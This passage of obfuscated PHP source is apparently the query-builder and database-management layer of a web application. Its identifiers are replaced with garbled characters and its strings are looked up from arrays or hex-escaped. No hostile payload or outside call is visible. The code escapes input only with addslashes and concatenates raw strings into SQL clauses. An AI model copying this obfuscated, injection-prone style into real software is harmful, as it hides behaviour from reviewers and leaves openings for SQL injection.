(is_string($ôÕ»çÚ)) { if (strstr($ôÕ»çÚ, $Ù²”ˆÑ½[53])) { return $ôÕ»çÚ; } $ôÕ»çÚ = explode($Ù²”ˆÑ½[50], $ôÕ»çÚ); array_walk($ôÕ»çÚ, array($this, $Ù²”ˆÑ½[1016])); } return $Ù²”ˆÑ½[1010] . trim(implode($Ù²”ˆÑ½[1112], $ôÕ»çÚ), $Ù²”ˆÑ½[475]) . $Ù²”ˆÑ½[1010]; } protected function parseWhere($ÊÖ¼¾¹–) { $Úº‚À‹Ü =& $_SERVER[€ä¾™²]; $úüí™¦ö = $Úº‚À‹Ü[12]; if (is_string($ÊÖ¼¾¹–)) { $úüí™¦ö = $ÊÖ¼¾¹–; } else { $äœè ½œ = isset($ÊÖ¼¾¹–[$Úº‚À‹Ü[1113]]) ? strtoupper($ÊÖ¼¾¹–[$Úº‚À‹Ü[1113]]) : $Úº‚À‹Ü[12]; if (in_array($äœè ½œ, array($Úº‚À‹Ü[1114], $Úº‚À‹Ü[1115], $Úº‚À‹Ü[1116]))) { $äœè ½œ = $Úº‚À‹Ü[53] . $äœè ½œ . $Úº‚À‹Ü[53]; unset($ÊÖ¼¾¹–[$Úº‚À‹Ü[1113]]); } else { $äœè ½œ = $Úº‚À‹Ü[1117]; } foreach ($ÊÖ¼¾¹– as $ œ÷Şöƒ => $ƒ­Ë»äÓ) { $úüí™¦ö .= $Úº‚À‹Ü[356]; if (is_numeric($ œ÷Şöƒ)) { $ œ÷Şöƒ = $Úº‚À‹Ü[1118]; } if (0 === strpos($ œ÷Şöƒ, $Úº‚À‹Ü[11])) { $úüí™¦ö .= $this->parseThinkWhere($ œ÷Şöƒ, $ƒ­Ë»äÓ); } else { if (!preg_match($Úº‚À‹Ü[1119], trim($ œ÷Şöƒ))) { think_exception(think_lang($Úº‚À‹Ü[1120]) . $Úº‚À‹Ü[4] . $ œ÷Şöƒ); } $ÜÍ’¹¥è = is_array($ƒ­Ë»äÓ) && isset($ƒ­Ë»äÓ[$Úº‚À‹Ü[1121]]); $ œ÷Şöƒ = trim($ œ÷Şöƒ); if (strpos($ œ÷Şöƒ, $Úº‚À‹Ü[213])) { $‰…“é»® = explode($Úº‚À‹Ü[213], $ œ÷Şöƒ); $Ò—ÈÄÓª = array(); foreach ($‰…“é»® as $İÓÚãª™ => $©áÈÖ·) { $ÇôíÅ£Ö = $ÜÍ’¹¥è ? $ƒ­Ë»äÓ[$İÓÚãª™] : $ƒ­Ë»äÓ; $Ò—ÈÄÓª[] = $Úº‚À‹Ü[338] . $this->parseWhereItem($this->parseKey($©áÈÖ·), $ÇôíÅ£Ö) . $Úº‚À‹Ü[1015]; } $úüí™¦ö .= implode($Úº‚À‹Ü[1122], $Ò—ÈÄÓª); } elseif (strpos($ œ÷Şöƒ, $Úº‚À‹Ü[285])) { $‰…“é»® = explode($Úº‚À‹Ü[285], $ œ÷Şöƒ); $Ò—ÈÄÓª = array(); foreach ($‰…“é»® as $İÓÚãª™ => $©áÈÖ·) { $ÇôíÅ£Ö = $ÜÍ’¹¥è ? $ƒ­Ë»äÓ[$İÓÚãª™] : $ƒ­Ë»äÓ; $Ò—ÈÄÓª[] = $Úº‚À‹Ü[338] . $this->parseWhereItem($this->parseKey($©áÈÖ·), $ÇôíÅ£Ö) . $Úº‚À‹Ü[1015]; } $úüí™¦ö .= implode($Úº‚À‹Ü[1117], $Ò—ÈÄÓª); } else { $úüí™¦ö .= $this->parseWhereItem($this->parseKey($ œ÷Şöƒ), $ƒ­Ë»äÓ); } } $úüí™¦ö .= $Úº‚À‹Ü[357] . $äœè ½œ; } $úüí™¦ö = substr($úüí™¦ö, 0, -strlen($äœè ½œ)); } return empty($úüí™¦ö) ? $Úº‚À‹Ü[12] : $Úº‚À‹Ü[1123] . $úüí™¦ö; } protected function parseWhereItem($´ü¯º‚õ, $êª¦ÓÔ) { $ªÚø™ï³ =& $_SERVER[€ä¾™²]; $»‘¶øŠë = $ªÚø™ï³[12]; if (is_array($êª¦ÓÔ)) { if (is_string($êª¦ÓÔ[0])) { $ø·¬”Ã¬ = strtolower($êª¦ÓÔ[0]); if (in_array($êª¦ÓÔ[0], array($ªÚø™ï³[464], $ªÚø™ï³[1124], $ªÚø™ï³[1125], $ªÚø™ï³[1126], $ªÚø™ï³[1127], $ªÚø™ï³[1128]))) { $»‘¶øŠë .= $´ü¯º‚õ . $ªÚø™ï³[53] . $êª¦ÓÔ[0] . $ªÚø™ï³[53] . $this->parseValue($êª¦ÓÔ[1]); } elseif (preg_match($ªÚø™ï³[1129], $êª¦ÓÔ[0])) { $»‘¶øŠë .= $´ü¯º‚õ . $ªÚø™ï³[53] . $this->exp[$ø·¬”Ã¬] . $ªÚø™ï³[53] . $this->parseValue($êª¦ÓÔ[1]); } elseif (preg_match($ªÚø™ï³[1130], $êª¦ÓÔ[0])) { if (is_array($êª¦ÓÔ[1])) { $ïşà–¹ù = isset($êª¦ÓÔ[2]) ? strtoupper($êª¦ÓÔ[2]) : $ªÚø™ï³[1115]; if (in_array($ïşà–¹ù, array($ªÚø™ï³[1114], $ªÚø™ï³[1115], $ªÚø™ï³[1116]))) { $¸Î‡ØÏ² = array(); foreach ($êª¦ÓÔ[1] as $¦¦êí) { $¸Î‡ØÏ²[] = $´ü¯º‚õ . $ªÚø™ï³[53] . $this->exp[$ø·¬”Ã¬] . $ªÚø™ï³[53] . $this->parseValue($¦¦êí); } $»‘¶øŠë .= $ªÚø™ï³[338] . implode($ªÚø™ï³[53] . $ïşà–¹ù . $ªÚø™ï³[53], $¸Î‡ØÏ²) . $ªÚø™ï³[1015]; } } else { $»‘¶øŠë .= $´ü¯º‚õ . $ªÚø™ï³[53] . $this->exp[$ø·¬”Ã¬] . $ªÚø™ï³[53] . $this->parseValue($êª¦ÓÔ[1]); } } elseif ($ªÚø™ï³[373] == $ø·¬”Ã¬) { $»‘¶øŠë .= $ªÚø™ï³[1013] . $´ü¯º‚õ . $ªÚø™ï³[53] . $êª¦ÓÔ[1] . $ªÚø™ï³[1131]; } elseif (preg_match($ªÚø™ï³[1132], $êª¦ÓÔ[0])) { $»‘¶øŠë .= $êª¦ÓÔ[0]; } elseif (preg_match($ªÚø™ï³[1133], $êª¦ÓÔ[0])) { if (isset($êª¦ÓÔ[2]) && $ªÚø™ï³[373] == $êª¦ÓÔ[2]) { $»‘¶øŠë .= $´ü¯º‚õ . $ªÚø™ï³[53] . $this->exp[$ø·¬”Ã¬] . $ªÚø™ï³[53] . $êª¦ÓÔ[1]; } else { if (is_string($êª¦ÓÔ[1])) { $êª¦ÓÔ[1] = explode($ªÚø™ï³[50], $êª¦ÓÔ[1]); } $¤ê¼ÜŠó = implode($ªÚø™ï³[50], $this->parseValue($êª¦ÓÔ[1])); $»‘¶øŠë .= $´ü¯º‚õ . $ªÚø™ï³[53] . $this->exp[$ø·¬”Ã¬] . $ªÚø™ï³[1013] . $¤ê¼ÜŠó . $ªÚø™ï³[1015]; } } elseif (preg_match($ªÚø™ï³[1134], $êª¦ÓÔ[0])) { $²Â·­‡Á = is_string($êª¦ÓÔ[1]) ? explode($ªÚø™ï³[50], $êª¦ÓÔ[1]) : $êª¦ÓÔ[1]; $»‘¶øŠë .= $ªÚø™ï³[1013] . $´ü¯º‚õ . $ªÚø™ï³[53] . $this->exp[$ø·¬”Ã¬] . $ªÚø™ï³[53] . $this->parseValue($²Â·­‡Á[0]) . $ªÚø™ï³[1117] . $this->parseValue($²Â·­‡Á[1]) . $ªÚø™ï³[357]; } else { think_exception(think_lang($ªÚø™ï³[1120]) . $ªÚø™ï³[4] . $êª¦ÓÔ[0]); } } else { $ª´ñ¦ = count($êª¦ÓÔ); $áÃ…ŞÌœ = $ªÚø™ï³[12]; if (is_string($êª¦ÓÔ[$ª´ñ¦ - 1])) { $áÃ…ŞÌœ = isset($êª¦ÓÔ[$ª´ñ¦ - 1]) ? strtoupper($êª¦ÓÔ[$ª´ñ¦ - 1]) : $ªÚø™ï³[12]; if (in_array($áÃ…ŞÌœ, array($ªÚø™ï³[1114], $ªÚø™ï³[1115], $ªÚø™ï³[1116]))) { $ª´ñ¦ = $ª´ñ¦ - 1; } } else { $áÃ…ŞÌœ = $ªÚø™ï³[1114]; } for ($£“çÙª¦ = 0; $£“çÙª¦ < $ª´ñ¦; $£“çÙª¦++) { $²Â·­‡Á = is_array($êª¦ÓÔ[$£“çÙª¦]) ? $êª¦ÓÔ[$£“çÙª¦][1] : $êª¦ÓÔ[$£“çÙª¦]; if ($ªÚø™ï³[373] == strtolower($êª¦ÓÔ[$£“çÙª¦][0])) { $»‘¶øŠë .= $ªÚø™ï³[338] . $´ü¯º‚õ . $ªÚø™ï³[53] . $²Â·­‡Á . $ªÚø™ï³[1131] . $áÃ…ŞÌœ . $ªÚø™ï³[53]; } else { $Ëè­Ş„á = is_array($êª¦ÓÔ[$£“çÙª¦]) ? $this->exp[strtolower($êª¦ÓÔ[$£“çÙª¦][0])] : $ªÚø™ï³[464]; if (!$Ëè­Ş„á && is_array($êª¦ÓÔ[$£“çÙª¦]) && in_array($êª¦ÓÔ[$£“çÙª¦][0], array($ªÚø™ï³[464], $ªÚø™ï³[1124], $ªÚø™ï³[1125], $ªÚø™ï³[1126], $ªÚø™ï³[1127], $ªÚø™ï³[1128]))) { $Ëè­Ş„á = $êª¦ÓÔ[$£“çÙª¦][0]; } $»‘¶øŠë .= $ªÚø™ï³[338] . $´ü¯º‚õ . $ªÚø™ï³[53] . $Ëè­Ş„á . $ªÚø™ï³[53] . $this->parseValue($²Â·­‡Á) . $ªÚø™ï³[1131] . $áÃ…ŞÌœ . $ªÚø™ï³[53]; } } $»‘¶øŠë = substr($»‘¶øŠë, 0, -4); } } else { $»‘¶øŠë .= $´ü¯º‚õ . $ªÚø™ï³[1135] . $this->parseValue($êª¦ÓÔ); } return $»‘¶øŠë; } protected function parseThinkWhere($¬Ò½…Ãğ, $åÓªô®–) { $âüíÓÓÚ =& $_SERVER[€ä¾™²]; $×Ğå¶ıÉ = $âüíÓÓÚ[12]; switch ($¬Ò½…Ãğ) { case $âüíÓÓÚ[428]: $×Ğå¶ıÉ = $åÓªô®–; break; case $âüíÓÓÚ[1118]: $×Ğå¶ıÉ = is_string($åÓªô®–) ? $åÓªô®– : substr($this->parseWhere($åÓªô®–), 6); break; case $âüíÓÓÚ[1136]: parse_str($åÓªô®–, $Í¹Ûòµä); if (isset($Í¹Ûòµä[$âüíÓÓÚ[1113]])) { $¼ó€éúÊ = $âüíÓÓÚ[53] . strtoupper($Í¹Ûòµä[$âüíÓÓÚ[1113]]) . $âüíÓÓÚ[53]; unset($Í¹Ûòµä[$âüíÓÓÚ[1113]]); } else { $¼ó€éúÊ = $âüíÓÓÚ[1117]; } $ôà°¥ñî = array(); foreach ($Í¹Ûòµä as $Ì€å±œ‹ => $÷Â–Ü) { $ôà°¥ñî[] = $this->parseKey($Ì€å±œ‹) . $âüíÓÓÚ[1135] . $this->parseValue($÷Â–Ü); } $×Ğå¶ıÉ = implode($¼ó€éúÊ, $ôà°¥ñî); break; } return $×Ğå¶ıÉ; } protected function parseLimit($ŸØî‡•Ø) { $ ¡ıÃ² =& $_SERVER[€ä¾™²]; return !empty($ŸØî‡•Ø) ? $ ¡ıÃ²[51] . $ŸØî‡•Ø . $ ¡ıÃ²[53] : $ ¡ıÃ²[12]; } protected function parseJoin($¬é¿·ÉÊ) { $ÀŸƒ™Ğü =& $_SERVER[€ä¾™²]; $Â«ÃÃ´Ä = $ÀŸƒ™Ğü[12]; if (!empty($¬é¿·ÉÊ)) { if (is_array($¬é¿·ÉÊ)) { foreach ($¬é¿·ÉÊ as $ß”«æ…ñ => $šŒ×®³) { if (!1 !== stripos($šŒ×®³, $ÀŸƒ™Ğü[1137])) { $Â«ÃÃ´Ä .= $ÀŸƒ™Ğü[53] . $šŒ×®³; } else { $Â«ÃÃ´Ä .= $ÀŸƒ™Ğü[1138] . $šŒ×®³; } } } else { $Â«ÃÃ´Ä .= $ÀŸƒ™Ğü[1138] . $¬é¿·ÉÊ; } } $Â«ÃÃ´Ä = preg_replace($ÀŸƒ™Ğü[1139], think_config($ÀŸƒ™Ğü[1043]) . $ÀŸƒ™Ğü[1140], $Â«ÃÃ´Ä); return $Â«ÃÃ´Ä; } protected function parseOrder($ö¯»áúƒ) { $Öà ¥ºä =& $_SERVER[€ä¾™²]; if (is_array($ö¯»áúƒ)) { $·÷ó˜Ê× = array(); foreach ($ö¯»áúƒ as $¢Ù¬Ìì¦ => $À¶”Ğ©­) { if (is_numeric($¢Ù¬Ìì¦)) { $·÷ó˜Ê×[] = $this->parseKey($À¶”Ğ©­); } else { $À¶”Ğ©­ = in_array(strtoupper(trim($À¶”Ğ©­)), array($Öà ¥ºä[1141], $Öà ¥ºä[1142])) ? $Öà ¥ºä[53] . $À¶”Ğ©­ : $Öà ¥ºä[12]; if (preg_match($Öà ¥ºä[1143], $¢Ù¬Ìì¦)) { $·÷ó˜Ê×[] = $this->parseKey($¢Ù¬Ìì¦) . $À¶”Ğ©­; } else { think_exception($Öà ¥ºä[1144] . $¢Ù¬Ìì¦); } } } $ö¯»áúƒ = implode($Öà ¥ºä[50], $·÷ó˜Ê×); } return !empty($ö¯»áúƒ) ? $Öà ¥ºä[1145] . $ö¯»áúƒ : $Öà ¥ºä[12]; } protected function parseGroup($¿¶¨ªô) { $’ìƒÅò‡ =& $_SERVER[€ä¾™²]; return !empty($¿¶¨ªô) ? $’ìƒÅò‡[1146] . $¿¶¨ªô : $’ìƒÅò‡[12]; } protected function parseHaving($¯¤ò‹Í) { $“ªğ›À‚ =& $_SERVER[€ä¾™²]; return !empty($¯¤ò‹Í) ? $“ªğ›À‚[1147] . $¯¤ò‹Í : $“ªğ›À‚[12]; } protected function parseComment($ˆ€­ä ø) { $Ì´¹ÙÍ =& $_SERVER[€ä¾™²]; return !empty($ˆ€­ä ø) ? $Ì´¹ÙÍ[1148] . $ˆ€­ä ø . $Ì´¹ÙÍ[1149] : $Ì´¹ÙÍ[12]; } protected function parseDistinct($—¸ú§ï¢) { $Õ¸çËÇ® =& $_SERVER[€ä¾™²]; return !empty($—¸ú§ï¢) ? $Õ¸çËÇ®[1150] : $Õ¸çËÇ®[12]; } protected function parseUnion($¡üÀĞ°‘) { $ö„í—åÓ =& $_SERVER[€ä¾™²]; if (empty($¡üÀĞ°‘)) { return $ö„í—åÓ[12]; } if (isset($¡üÀĞ°‘[$ö„í—åÓ[424]])) { $¶Å§²¯Œ = $ö„í—åÓ[1151]; unset($¡üÀĞ°‘[$ö„í—åÓ[424]]); } else { $¶Å§²¯Œ = $ö„í—åÓ[1152]; } foreach ($¡üÀĞ°‘ as $Šò ì¿æ) { $€‘½¦Í»[] = $¶Å§²¯Œ . (is_array($Šò ì¿æ) ? $this->buildSelectSql($Šò ì¿æ) : $Šò ì¿æ); } return implode($ö„í—åÓ[53], $€‘½¦Í»); } public function insert($÷ßÔÊµï, $ØèÊĞÑÉ = array(), $õñ—ãù = false) { $¤Ïö’ú« =& $_SERVER[€ä¾™²]; $½ æÆ‰À = $ãø×´Òà = array(); $this->model = $ØèÊĞÑÉ[$¤Ïö’ú«[360]]; foreach ($÷ßÔÊµï as $¹‰ûÃŞÃ => $Æµß¾ò ) { if (is_array($Æµß¾ò ) && $¤Ïö’ú«[373] == $Æµß¾ò [0]) { $ãø×´Òà[] = $this->parseKey($¹‰ûÃŞÃ); $½ æÆ‰À[] = $Æµß¾ò [1]; } elseif (is_scalar($Æµß¾ò ) || is_null($Æµß¾ò )) { $ãø×´Òà[] = $this->parseKey($¹‰ûÃŞÃ); $½ æÆ‰À[] = $this->parseValue($Æµß¾ò ); } } $Ú„½Ú†Ÿ = ($õñ—ãù ? $¤Ïö’ú«[1017] : $¤Ïö’ú«[1018]) . $¤Ïö’ú«[1019] . $this->parseTable($ØèÊĞÑÉ[$¤Ïö’ú«[358]]) . $¤Ïö’ú«[1013] . implode($¤Ïö’ú«[50], $ãø×´Òà) . $¤Ïö’ú«[1014] . implode($¤Ïö’ú«[50], $½ æÆ‰À) . $¤Ïö’ú«[1015]; $Ú„½Ú†Ÿ .= $this->parseLock(isset($ØèÊĞÑÉ[$¤Ïö’ú«[954]]) ? $ØèÊĞÑÉ[$¤Ïö’ú«[954]] : !1); $Ú„½Ú†Ÿ .= $this->parseComment(!empty($ØèÊĞÑÉ[$¤Ïö’ú«[430]]) ? $ØèÊĞÑÉ[$¤Ïö’ú«[430]] : $¤Ïö’ú«[12]); return $this->execute($Ú„½Ú†Ÿ, $this->parseBind(!empty($ØèÊĞÑÉ[$¤Ïö’ú«[362]]) ? $ØèÊĞÑÉ[$¤Ïö’ú«[362]] : array())); } public function selectInsert($ÛØÏƒ, $±¥‘Õ‹ô, $ıîè³èô = array()) { $àœ÷Øˆò =& $_SERVER[€ä¾™²]; $this->model = $ıîè³èô[$àœ÷Øˆò[360]]; if (is_string($ÛØÏƒ)) { $ÛØÏƒ = explode($àœ÷Øˆò[50], $ÛØÏƒ); } array_walk($ÛØÏƒ, array($this, $àœ÷Øˆò[1016])); $—¦¿·¸± = $àœ÷Øˆò[1153] . $this->parseTable($±¥‘Õ‹ô) . $àœ÷Øˆò[1013] . implode($àœ÷Øˆò[50], $ÛØÏƒ) . $àœ÷Øˆò[1131]; $—¦¿·¸± .= $this->buildSelectSql($ıîè³èô); return $this->execute($—¦¿·¸±, $this->parseBind(!empty($ıîè³èô[$àœ÷Øˆò[362]]) ? $ıîè³èô[$àœ÷Øˆò[362]] : array())); } public function update($³ƒïÈ¥ó, $£›¨Áİı) { $¥Á‰šáî =& $_SERVER[€ä¾™²]; $this->model = $£›¨Áİı[$¥Á‰šáî[360]]; $€ôŸçÒ€ = $¥Á‰šáî[1154] . $this->parseTable($£›¨Áİı[$¥Á‰šáî[358]]) . $this->parseSet($³ƒïÈ¥ó) . $this->parseWhere(!empty($£›¨Áİı[$¥Á‰šáî[354]]) ? $£›¨Áİı[$¥Á‰šáî[354]] : $¥Á‰šáî[12]) . $this->parseOrder(!empty($£›¨Áİı[$¥Á‰šáî[442]]) ? $£›¨Áİı[$¥Á‰šáî[442]] : $¥Á‰šáî[12]) . $this->parseLimit(!empty($£›¨Áİı[$¥Á‰šáî[369]]) ? $£›¨Áİı[$¥Á‰šáî[369]] : $¥Á‰šáî[12]) . $this->parseLock(isset($£›¨Áİı[$¥Á‰šáî[954]]) ? $£›¨Áİı[$¥Á‰šáî[954]] : !1) . $this->parseComment(!empty($£›¨Áİı[$¥Á‰šáî[430]]) ? $£›¨Áİı[$¥Á‰šáî[430]] : $¥Á‰šáî[12]); return $this->execute($€ôŸçÒ€, $this->parseBind(!empty($£›¨Áİı[$¥Á‰šáî[362]]) ? $£›¨Áİı[$¥Á‰šáî[362]] : array())); } public function delete($Æ‡Óœì¾ = array()) { $û¸ó“î =& $_SERVER[€ä¾™²]; $this->model = $Æ‡Óœì¾[$û¸ó“î[360]]; $ôïíä¥ = $û¸ó“î[1155] . $this->parseTable($Æ‡Óœì¾[$û¸ó“î[358]]) . $this->parseWhere(!empty($Æ‡Óœì¾[$û¸ó“î[354]]) ? $Æ‡Óœì¾[$û¸ó“î[354]] : $û¸ó“î[12]) . $this->parseOrder(!empty($Æ‡Óœì¾[$û¸ó“î[442]]) ? $Æ‡Óœì¾[$û¸ó“î[442]] : $û¸ó“î[12]) . $this->parseLimit(!empty($Æ‡Óœì¾[$û¸ó“î[369]]) ? $Æ‡Óœì¾[$û¸ó“î[369]] : $û¸ó“î[12]) . $this->parseLock(isset($Æ‡Óœì¾[$û¸ó“î[954]]) ? $Æ‡Óœì¾[$û¸ó“î[954]] : !1) . $this->parseComment(!empty($Æ‡Óœì¾[$û¸ó“î[430]]) ? $Æ‡Óœì¾[$û¸ó“î[430]] : $û¸ó“î[12]); return $this->execute($ôïíä¥, $this->parseBind(!empty($Æ‡Óœì¾[$û¸ó“î[362]]) ? $Æ‡Óœì¾[$û¸ó“î[362]] : array())); } public function select($°ìÒÌ™¯ = array()) { $ä³ƒğåÂ =& $_SERVER[€ä¾™²]; $this->model = $°ìÒÌ™¯[$ä³ƒğåÂ[360]]; $€©†Æ·õ = $this->buildSelectSql($°ìÒÌ™¯); $ùÉ¡­¢ = isset($°ìÒÌ™¯[$ä³ƒğåÂ[425]]) ? $°ìÒÌ™¯[$ä³ƒğåÂ[425]] : !1; if ($ùÉ¡­¢) { $ˆª·îí§ = is_string($ùÉ¡­¢[$ä³ƒğåÂ[95]]) ? $ùÉ¡­¢[$ä³ƒğåÂ[95]] : $ä³ƒğåÂ[1156] . md5($€©†Æ·õ); $ÜâÃ€¡ = think_cache($ˆª·îí§, $ä³ƒğåÂ[12], $ùÉ¡­¢); if (!1 !== $ÜâÃ€¡) { return $ÜâÃ€¡; } } $×àƒé§Æ = $this->query($€©†Æ·õ, $this->parseBind(!empty($°ìÒÌ™¯[$ä³ƒğåÂ[362]]) ? $°ìÒÌ™¯[$ä³ƒğåÂ[362]] : array())); if ($ùÉ¡­¢ && !1 !== $×àƒé§Æ) { think_cache($ˆª·îí§, $×àƒé§Æ, $ùÉ¡­¢); } return $×àƒé§Æ; } public function buildSelectSql($ìºÅá = array()) { $èø“Âöª =& $_SERVER[€ä¾™²]; if (isset($ìºÅá[$èø“Âöª[429]])) { if (strpos($ìºÅá[$èø“Âöª[429]], $èø“Âöª[50])) { list($†ù€®âÉ, $Ò«ÍĞˆ¤) = explode($èø“Âöª[50], $ìºÅá[$èø“Âöª[429]]); } else { $†ù€®âÉ = $ìºÅá[$èø“Âöª[429]]; } $†ù€®âÉ = $†ù€®âÉ ? $†ù€®âÉ : 1; $Ò«ÍĞˆ¤ = isset($Ò«ÍĞˆ¤) ? $Ò«ÍĞˆ¤ : (is_numeric($ìºÅá[$èø“Âöª[369]]) ? $ìºÅá[$èø“Âöª[369]] : 20); $öÅşÜ¨Ã = $Ò«ÍĞˆ¤ * ((int) $†ù€®âÉ - 1); $ìºÅá[$èø“Âöª[369]] = $öÅşÜ¨Ã . $èø“Âöª[50] . $Ò«ÍĞˆ¤; } if (think_config($èø“Âöª[1157])) { $¿„Ú“´ = $èø“Âöª[1158] . md5(serialize($ìºÅá)); $ÉÎ£˜…ä = think_cache($¿„Ú“´); if ($ÉÎ£˜…ä) { return $ÉÎ£˜…ä; } } $×°°°ì– = $this->parseSql($this->selectSql, $ìºÅá); $×°°°ì– .= $this->parseLock(isset($ìºÅá[$èø“Âöª[954]]) ? $ìºÅá[$èø“Âöª[954]] : !1); if (isset($¿„Ú“´)) { think_cache($¿„Ú“´, $×°°°ì–); } return $×°°°ì–; } public function parseSql($É½Êİ½, $–ø§Î“ = array()) { $³°¢Ø¢¸ =& $_SERVER[€ä¾™²]; $É½Êİ½ = str_replace(array($³°¢Ø¢¸[1159], $³°¢Ø¢¸[1160], $³°¢Ø¢¸[1161], $³°¢Ø¢¸[1162], $³°¢Ø¢¸[1163], $³°¢Ø¢¸[1164], $³°¢Ø¢¸[1165], $³°¢Ø¢¸[1166], $³°¢Ø¢¸[1167], $³°¢Ø¢¸[1168], $³°¢Ø¢¸[1169]), array($this->parseTable("{$–ø§Î“[$³°¢Ø¢¸[358]]}"), $this->parseDistinct(isset($–ø§Î“[$³°¢Ø¢¸[1170]]) ? $–ø§Î“[$³°¢Ø¢¸[1170]] : !1), $this->parseField(!empty($–ø§Î“[$³°¢Ø¢¸[352]]) ? $–ø§Î“[$³°¢Ø¢¸[352]] : $³°¢Ø¢¸[221]), $this->parseJoin(!empty($–ø§Î“[$³°¢Ø¢¸[361]]) ? $–ø§Î“[$³°¢Ø¢¸[361]] : $³°¢Ø¢¸[12]), $this->parseWhere(!empty($–ø§Î“[$³°¢Ø¢¸[354]]) ? $–ø§Î“[$³°¢Ø¢¸[354]] : $³°¢Ø¢¸[12]), $this->parseGroup(!empty($–ø§Î“[$³°¢Ø¢¸[605]]) ? $–ø§Î“[$³°¢Ø¢¸[605]] : $³°¢Ø¢¸[12]), $this->parseHaving(!empty($–ø§Î“[$³°¢Ø¢¸[1171]]) ? $–ø§Î“[$³°¢Ø¢¸[1171]] : $³°¢Ø¢¸[12]), $this->parseOrder(!empty($–ø§Î“[$³°¢Ø¢¸[442]]) ? $–ø§Î“[$³°¢Ø¢¸[442]] : $³°¢Ø¢¸[12]), $this->parseLimit(!empty($–ø§Î“[$³°¢Ø¢¸[369]]) ? $–ø§Î“[$³°¢Ø¢¸[369]] : $³°¢Ø¢¸[12]), $this->parseUnion(!empty($–ø§Î“[$³°¢Ø¢¸[423]]) ? $–ø§Î“[$³°¢Ø¢¸[423]] : $³°¢Ø¢¸[12]), $this->parseComment(!empty($–ø§Î“[$³°¢Ø¢¸[430]]) ? $–ø§Î“[$³°¢Ø¢¸[430]] : $³°¢Ø¢¸[12])), $É½Êİ½); return $É½Êİ½; } public function getLastSql($­†´ŠØâ = '') { return $­†´ŠØâ ? $this->modelSql[$­†´ŠØâ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ÎŒ†Õå) { return addslashes($ÎŒ†Õå); } public function setModel($´íç¤µ™) { $this->model = $´íç¤µ™; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ŸŠïÛ§¸ = array()) { $í‡ñÒ›ß =& $_SERVER[€ä¾™²]; if (empty($ŸŠïÛ§¸)) { $ŸŠïÛ§¸ = $GLOBALS[$í‡ñÒ›ß[6]][$í‡ñÒ›ß[21]]; } $this->database = $ŸŠïÛ§¸; } public function model($Ô…ÈÂÏå = '') { return new ModelBase($Ô…ÈÂÏå, $_SERVER[€ä¾™²][12], $this->database); } public function db($¯§×¢Êõ = false) { $Úù¯Ëúä =& $_SERVER[€ä¾™²]; $ı²ë‚¢” = array_change_key_case($this->database); if ($this->dbType() == $Úù¯Ëúä[13] || !$¯§×¢Êõ) { return $this->model()->db(); } $îÉòúµÛ = $ı²ë‚¢”[$Úù¯Ëúä[1085]]; $ı²ë‚¢”[$Úù¯Ëúä[1085]] = $Úù¯Ëúä[12]; if ($ı²ë‚¢”[$Úù¯Ëúä[1080]] == $Úù¯Ëúä[1077]) { $Å¡Éõ ¢ = $ı²ë‚¢”[$Úù¯Ëúä[1086]]; $ı²ë‚¢”[$Úù¯Ëúä[1086]] = substr($Å¡Éõ ¢, 0, strrpos($Å¡Éõ ¢, $Úù¯Ëúä[1172])); } $this->database = $ı²ë‚¢”; $äÚ¶ò–½ = $this->model()->db(); try { $â¨ÂĞÚØ = $äÚ¶ò–½->execute("\x73\150\157\167\x20\144\141\x74\x61\142\141\163\x65\x73\40\154\x69\153\145\40\x27{$îÉòúµÛ}\x27"); } catch (Exception $¹†•ş±¤) { } if (!$â¨ÂĞÚØ) { $äÚ¶ò–½->execute("\143\162\x65\141\x74\x65\x20\144\141\164\x61\x62\141\x73\145\40\140{$îÉòúµÛ}\140"); } $ı²ë‚¢”[$Úù¯Ëúä[1085]] = $îÉòúµÛ; if ($ı²ë‚¢”[$Úù¯Ëúä[1080]] == $Úù¯Ëúä[1077]) { $ı²ë‚¢”[$Úù¯Ëúä[1086]] .= $Úù¯Ëúä[1172] . $îÉòúµÛ; } $this->database = $ı²ë‚¢”; $äÚ¶ò–½->execute("\165\x73\145\x20\x60{$îÉòúµÛ}\x60"); return $äÚ¶ò–½; } public function createTable($÷ÌâÇŒ, &$¸Ò•ÛŞİ) { $â§™­ü =& $_SERVER[€ä¾™²]; if (!IO::exist($÷ÌâÇŒ)) { show_json(LNG($â§™­ü[1173]), !1); } $€ÎÍäá = $this->model()->db(); $’Àö‰ÄĞ = sqlSplit(IO::getContent($÷ÌâÇŒ)); foreach ($’Àö‰ÄĞ as $Üñ»³ï‹) { $³ˆ©¦ËÛ = stripos($Üñ»³ï‹, $â§™­ü[1174]) === 0; if ($³ˆ©¦ËÛ) { $¸Ò•ÛŞİ->task[$â§™­ü[1175]] += 1; } $€ÎÍäá->execute($Üñ»³ï‹); if ($³ˆ©¦ËÛ) { preg_match($â§™­ü[1176], $Üñ»³ï‹, $‰ÛìüÙÏ); $¸Ò•ÛŞİ->task[$â§™­ü[1177]] = $‰ÛìüÙÏ[1]; $¸Ò•ÛŞİ->update(1); } } } public function insertTable($ü¤ÏêÇô, &$ĞÁø°¥¾) { $ÕÙ‹Ö¡Ñ =& $_SERVER[€ä¾™²]; $²å¨àœ™ = $this->model()->db(); $â¹ €¨ã = $®Ì„ÍùÀ ? array($®Ì„ÍùÀ) : $²å¨àœ™->getTables(); foreach ($ü¤ÏêÇô as $ôğ«ËÆÈ) { $®Ì„ÍùÀ = basename($ôğ«ËÆÈ, $ÕÙ‹Ö¡Ñ[892]); if (!in_array($®Ì„ÍùÀ, $â¹ €¨ã)) { continue; } $ĞÁø°¥¾->task[$ÕÙ‹Ö¡Ñ[1177]] = $®Ì„ÍùÀ; if ($®Ì„ÍùÀ == $ÕÙ‹Ö¡Ñ[472]) { continue; } if (get_filesize($ôğ«ËÆÈ) == 0) { continue; } $Ø¥È“Ş = $this->sqlToDb($ôğ«ËÆÈ, $ĞÁø°¥¾); if (!$Ø¥È“Ş) { show_json(LNG($ÕÙ‹Ö¡Ñ[1178]) . "\133{$®Ì„ÍùÀ}\135", !1); } } } public function sqlFromDb($™Ùù² ø, $Š©Î×Î˜, &$»Š‘Ÿ», $œõ¶Íæá = '') { if ($»Š‘Ÿ») { $»Š‘Ÿ»->task[$_SERVER[€ä¾™²][1177]] = $™Ùù² ø; } $ÇÍ‚şĞŒ = $this->model($™Ùù² ø); $‘¹ğùø› = 0; $º¿¡±Îş = 0; $ìù·šëç = 10000; $ÂÛĞµ´û = 